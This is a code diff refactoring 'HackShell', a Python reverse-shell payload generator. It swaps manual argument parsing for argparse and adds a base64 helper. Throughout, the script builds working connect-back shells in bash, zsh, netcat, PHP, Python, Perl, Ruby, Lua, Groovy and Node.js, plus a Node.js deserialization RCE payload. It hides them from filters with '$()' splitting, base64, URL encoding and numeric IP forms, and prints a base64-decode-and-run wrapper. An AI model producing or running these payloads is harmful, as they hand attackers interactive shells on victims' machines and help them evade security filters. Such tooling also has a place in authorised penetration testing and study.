@@ -1,26 +1,33 @@
-import sys, urllib.parse, base64, struct, socket
+#!/usr/bin/python3
+
+from argparse import RawTextHelpFormatter
+import urllib.parse, base64, struct, socket, argparse
 
 def menu():
-    return print(""".------..------..------..------..------..------..------..------..------.
+    return (""".------..------..------..------..------..------..------..------..------.
 |H.--. ||A.--. ||C.--. ||K.--. ||S.--. ||H.--. ||E.--. ||L.--. ||L.--. |
 | :/\: || (\/) || :/\: || :/\: || :/\: || :/\: || (\/) || :/\: || :/\: |
 | (__) || :\/: || :\/: || :\/: || :\/: || (__) || :\/: || (__) || (__) |
 | '--'H|| '--'A|| '--'C|| '--'K|| '--'S|| '--'H|| '--'E|| '--'L|| '--'L|
 `------'`------'`------'`------'`------'`------'`------'`------'`------'
-HackShell 1.0\n\n--lhost: ip\n--lport: port\n--payload: bash,zsh,nc,php,python,perl,ruby,lua,groovy,nodejs,all\n--types: b64,urle,int,octa,hex,jlre,func\n\ne.g.\npython hackshell.py --payload zsh --lhost 192.168.0.20 --lport 443 --type urle\n""")
+""")
 
-def ReverseShellBash(ip, port, type):
-    rsba = ''.join(("ba$()sh -$()i '/dev/tcp/"+ip+"/"+port," 0>&1'"))
-    message_bytes = rsba.encode('ascii')
+def Encodeb64(payload):
+    message_bytes = payload.encode('ascii')
     base64_bytes = base64.b64encode(message_bytes)
     base64_message = base64_bytes.decode('ascii')
+    return base64_message
+
+def ReverseShellBash(ip, port, type):
+    payload = ''.join(("ba$()sh -$()i '/dev/tcp/"+ip+"/"+port," 0>&1'"))
+    base64_message = Encodeb64(payload)
 
     if type == 'd':
-        print(rsba)
+        print(payload)
     elif type == 'b64':
         print(base64_message)
     elif type == 'urle':
-        urltype = urllib.parse.quote(message_bytes)
+        urltype = urllib.parse.quote(payload)
         print(urltype)
     elif type == 'long':
         ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
@@ -38,17 +45,15 @@ def ReverseShellBash(ip, port, type):
         print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")
 
 def ReverseShellzsh(ip, port, type):
-    rsz = ''.join(("zsh -c 'zmodload zsh/net/tcp && ztcp"+ip,port+"&& zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"))
-    message_bytes = rsz.encode('ascii')
-    base64_bytes = base64.b64encode(message_bytes)
-    base64_message = base64_bytes.decode('ascii')
+    payload = ''.join(("zsh -c 'zmodload zsh/net/tcp && ztcp"+ip,port+"&& zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"))
+    base64_message = Encodeb64(payload)
 
     if type == 'd':
-        print(rsz)
+        print(payload)
     elif type == 'b64':
         print(base64_message)
     elif type == 'urle':
-        urltype = urllib.parse.quote(message_bytes)
+        urltype = urllib.parse.quote(payload)
         print(urltype)
     elif type == 'long':
         ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
@@ -66,17 +71,15 @@ def ReverseShellzsh(ip, port, type):
         print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")
 
 def ReverseShellNetcat(ip, port, type):
-    rsnc = ''.join(("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|n$()c "+ip+" "+port, " >/tmp/f"))
-    message_bytes = rsnc.encode('ascii')
-    base64_bytes = base64.b64encode(message_bytes)
-    base64_message = base64_bytes.decode('ascii')
+    payload = ''.join(("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|n$()c "+ip+" "+port, " >/tmp/f"))
+    base64_message = Encodeb64(payload)
 
     if type == 'd':
-        print(rsnc)
+        print(payload)
     elif type == 'b64':
         print(base64_message)
     elif type =='urle':
-        urltype = urllib.parse.quote(message_bytes)
+        urltype = urllib.parse.quote(payload)
         print(urltype)
     elif type == 'octa':
         ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
@@ -90,17 +93,15 @@ def ReverseShellNetcat(ip, port, type):
         print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")
 
 def ReverseShellPhp(ip, port,type):
-    rsph = ''.join(("ph$()p -$()r '$sock=fsockopen("+"\""+ ip +"\"" +","+port+');exec("/bin/sh -i <&3 >&3 2>&3");\''))
-    message_bytes = rsph.encode('ascii')
-    base64_bytes = base64.b64encode(message_bytes)
-    base64_message = base64_bytes.decode('ascii')
+    payload = ''.join(("ph$()p -$()r '$sock=fsockopen("+"\""+ ip +"\"" +","+port+');exec("/bin/sh -i <&3 >&3 2>&3");\''))
+    base64_message = Encodeb64(payload)
 
     if type == 'd':
-        print(rsph)
+        print(payload)
     elif type == 'b64':
         print(base64_message)
     elif type =='urle':
-        urltype = urllib.parse.quote(message_bytes)
+        urltype = urllib.parse.quote(payload)
         print(urltype)
     elif type == 'long':
         ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
@@ -118,17 +119,15 @@ def ReverseShellPhp(ip, port,type):
         print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")
 
 def ReverseShellPython(ip, port,type):
-    rspy = ''.join(("py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ip+"\","+port+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
-    message_bytes = rspy.encode('ascii')
-    base64_bytes = base64.b64encode(message_bytes)
-    base64_message = base64_bytes.decode('ascii')
+    payload = ''.join(("py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ip+"\","+port+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
+    base64_message = Encodeb64(payload)
     
     if type == 'd':
-        print(rspy)
+        print(payload)
     elif type == 'b64':
         print(base64_message)
     elif type == 'urle':
-        urltype = urllib.parse.quote(message_bytes)
+        urltype = urllib.parse.quote(payload)
         print(urltype)
     elif type == 'long':
         ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
@@ -146,17 +145,15 @@ def ReverseShellPython(ip, port,type):
         print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")
 
 def ReverseShellPerl(ip, port,type):
-    rspe = ''.join(("pe$()rl -$()e 'use Socket;$i=\""+ip+"\";$p="+port+";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"))
-    message_bytes = rspe.encode('ascii')
-    base64_bytes = base64.b64encode(message_bytes)
-    base64_message = base64_bytes.decode('ascii')
+    payload = ''.join(("pe$()rl -$()e 'use Socket;$i=\""+ip+"\";$p="+port+";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"))
+    base64_message = Encodeb64(payload)
 
     if type == "d":
-        print(rspe)
+        print(payload)
     elif type == 'b64':
         print(base64_message)
     elif type =='urle':
-        urltype = urllib.parse.quote(message_bytes)
+        urltype = urllib.parse.quote(payload)
         print(urltype)
     elif type == 'long':
         ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
@@ -174,18 +171,17 @@ def ReverseShellPerl(ip, port,type):
         print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")
 
 def ReverseShellRuby(ip, port, type):
-    rsr = ''.join(("ru$()by -rsocket -$()e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\""+ip+"\","+port+"))'"))
-    message_bytes = rsr.encode('ascii')
-    base64_bytes = base64.b64encode(message_bytes)
-    base64_message = base64_bytes.decode('ascii')
+    payload = ''.join(("ru$()by -rsocket -$()e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\""+ip+"\","+port+"))'"))
+    base64_message = Encodeb64(payload)
 
     if type == "d":
-        print(rsr)
+        print(payload)
     elif type == 'b64':
         print(base64_message)
     elif type == 'urle':
-        urltype = urllib.parse.quote(message_bytes)
+        urltype = urllib.parse.quote(payload)
         print(urltype)
+        
     elif type == 'long':
         ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
         rsr2 = ''.join(("ru$()by -rsocket -$()e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\""+str(ip2)+"\","+port+"))'"))
@@ -202,18 +198,17 @@ def ReverseShellRuby(ip, port, type):
         print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")
 
 def ReverseShellLua(ip, port, type):
-    rsl = ''.join(("lua -e \"require('socket');require('os');t=socket.tcp();t:connect('\""+ip+"\"','"+port+"');os.execute('sh -i <&3 >&3 2>&3');\""))
-    message_bytes = rsl.encode('ascii')
-    base64_bytes = base64.b64encode(message_bytes)
-    base64_message = base64_bytes.decode('ascii')
+    payload = ''.join(("lua -e \"require('socket');require('os');t=socket.tcp();t:connect('\""+ip+"\"','"+port+"');os.execute('sh -i <&3 >&3 2>&3');\""))
+    base64_message = Encodeb64(payload)
 
     if type == "d":
-        print(rsl)
+        print(payload)
     elif type == 'b64':
         print(base64_message)
     elif type == 'urle':
-        urltype = urllib.parse.quote(message_bytes)
+        urltype = urllib.parse.quote(payload)
         print(urltype)
+
     elif type == 'long':
         ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
         rsl2 = ''.join(("lua -e \"require('socket');require('os');t=socket.tcp();t:connect('\""+str(ip2)+"\",'"+port+"');os.execute('sh -i <&3 >&3 2>&3');\""))
@@ -230,18 +225,17 @@ def ReverseShellLua(ip, port, type):
         print("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")
 
 def ReverseShellGroovy(ip, port, type):
-    rsg = ''.join(("""r = Runtime.getRuntime()
+    payload = ''.join(("""r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/"""+ip+"""/"""+port+""";cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()"""))
-    message_bytes = rsg.encode('ascii')
-    base64_bytes = base64.b64encode(message_bytes)
-    base64_message = base64_bytes.decode('ascii')
+    base64_message = Encodeb64(payload)
+
     if type == "d":
-        print(rsg)
+        print(payload)
     elif type == 'b64':
         print(base64_message)
     elif type == 'urle':
-        urltype = urllib.parse.quote(message_bytes)
+        urltype = urllib.parse.quote(payload)
         print(urltype)
     elif type == 'long':
         ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
@@ -270,95 +264,41 @@ def ReverseShellnodejs(ip, port, type):
     elif type == "func":
         print("{\"rce\":\"_$$ND_FUNC$$_function(){require(\\\"child_process\\\").execSync(\\\"/bin/b$()ash -c '/bin/sh -i >& /dev/tcp/"+ip+"/"+port,"0>&1\'\\\")}()\"}")
 
-try:
-    payload = sys.argv[sys.argv[:].index('--payload')+1]
-    if  payload == "bash" and sys.argv[:].index('--lhost') and sys.argv[:].index('--lport'):
-        if len(sys.argv) <=7:
-            type = "d"
-        else:
-            type=sys.argv[sys.argv[:].index('--type')+1]
-        ReverseShellBash(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1],type)
-
-    elif payload == "zsh" and sys.argv[:].index('--lhost') and sys.argv[:].index('--lport'):
-        if len(sys.argv) <=7:
-                type = "d"
-        else:
-            type=sys.argv[sys.argv[:].index('--type')+1]
-        ReverseShellzsh(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
-
-    elif payload == "nc" and sys.argv[:].index('--lhost') and sys.argv[:].index('--lport'):
-        if len(sys.argv) <=7:
-            type = "d"
-        else:
-            type=sys.argv[sys.argv[:].index('--type')+1]  
-        ReverseShellNetcat(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
-
-    elif payload == "php" and sys.argv[:].index('--lhost') and sys.argv[:].index('--lport'):
-        if len(sys.argv) <=7:
-                type = "d"
-        else:
-            type=sys.argv[sys.argv[:].index('--type')+1]  
-        ReverseShellPhp(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
-
-    elif payload == "python" and sys.argv[:].index('--lhost') and sys.argv[:].index('--lport'):
-        if len(sys.argv) <=7:
-                type = "d"
-        else:
-            type=sys.argv[sys.argv[:].index('--type')+1]  
-        ReverseShellPython(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
-
-    elif payload == "perl" and sys.argv[:].index('--lhost') and sys.argv[:].index('--lport'):
-        if len(sys.argv) <=7:
-                type = "d"
-        else:
-            type=sys.argv[sys.argv[:].index('--type')+1]
-        ReverseShellPerl(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
-
-    elif payload == "ruby" and sys.argv[:].index('--lhost') and sys.argv[:].index('--lport'):
-        if len(sys.argv) <=7:
-                type = "d"
-        else:
-            type=sys.argv[sys.argv[:].index('--type')+1]
-        ReverseShellRuby(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
-
-    elif payload == "lua" and sys.argv[:].index('--lhost') and sys.argv[:].index('--lport'):
-        if len(sys.argv) <=7:
-                type = "d"
-        else:
-            type=sys.argv[sys.argv[:].index('--type')+1]
-        ReverseShellLua(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
-
-    elif payload == "groovy" and sys.argv[:].index('--lhost') and sys.argv[:].index('--lport'):
-        if len(sys.argv) <=7:
-            type = "d"
-        else:
-            type=sys.argv[sys.argv[:].index('--type')+1]
-            ReverseShellGroovy(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
-
-    elif payload == "nodejs" and sys.argv[:].index('--lhost') and sys.argv[:].index('--lport'):
-        if len(sys.argv) <=7:
-            type = "d"
-        else:
-            type=sys.argv[sys.argv[:].index('--type')+1]
-        ReverseShellnodejs(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
-
-    elif sys.argv[sys.argv[:].index('--payload')+1] == "all" and sys.argv[:].index('--lhost') and sys.argv[:].index('--lport'):
-        if len(sys.argv) <=8:
-            print(len(sys.argv))
-            type = "d"
-        else:
-            type=sys.argv[sys.argv[:].index('--type')+1]
-        ReverseShellBash(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
-        ReverseShellzsh(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
-        ReverseShellNetcat(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
-        ReverseShellPython(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
-        ReverseShellPerl(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
-        ReverseShellRuby(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
-        ReverseShellLua(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
-        ReverseShellGroovy(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
-        ReverseShellnodejs(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
-    elif sys.argv[:].index('--help'):
-        menu()
-except:
-    menu()
-    print("Some parameter is missing...")
+parser = argparse.ArgumentParser(description=menu(), formatter_class=RawTextHelpFormatter, usage="python hackshell.py --payload bash --lhost 192.168.0.20 --lport 443 --type hex")
+parser.add_argument('--payload', dest='payload', action='store', type=str, help='bash,zsh,nc,php,python,perl,ruby,lua,groovy,nodejs,all', required=True)
+parser.add_argument('--lhost', dest='lhost', action='store', type=str, help='ip')
+parser.add_argument('--lport', dest='lport', action='store', type=str, help='port')
+parser.add_argument('--type', dest='type', action='store', type=str, help="b64,urle,int,octa,hex,jlre,func")
+args=parser.parse_args()
+if not args.type:
+    args.type = "d"
+if  args.payload == "bash":
+    ReverseShellBash(args.lhost,args.lport, args.type)
+elif args.payload == "zsh":
+    ReverseShellzsh(args.lhost, args.lport, args.type)
+elif args.payload == "nc":
+    ReverseShellNetcat(args.lhost, args.lport, args.type)
+elif args.payload == "php" :
+    ReverseShellPhp(args.lhost, args.lport, args.type)
+elif args.payload == "python":
+    ReverseShellPython(args.lhost, args.lport, args.type)
+elif args.payload == "perl":
+    ReverseShellPerl(args.lhost, args.lport, args.type)
+elif args.payload == "ruby":
+    ReverseShellRuby(args.lhost, args.lport, args.type)
+elif args.payload == "lua":
+    ReverseShellLua(args.lhost, args.lport, args.type)
+elif args.payload == "groovy":
+    ReverseShellGroovy(args.lhost, args.lport, args.type)
+elif args.payload == "nodejs":
+    ReverseShellnodejs(args.lhost, args.lport, args.type)
+elif args.payload == "all":
+    ReverseShellBash(args.lhost, args.lport, args.type)
+    ReverseShellzsh(args.lhost, args.lport, args.type)
+    ReverseShellNetcat(args.lhost, args.lport, args.type)
+    ReverseShellPython(args.lhost, args.lport, args.type)
+    ReverseShellPerl(args.lhost, args.lport, args.type)
+    ReverseShellRuby(args.lhost, args.lport, args.type)
+    ReverseShellLua(args.lhost, args.lport, args.type)
+    ReverseShellGroovy(args.lhost, args.lport, args.type)
+    ReverseShellnodejs(args.lhost, args.lport, args.type)
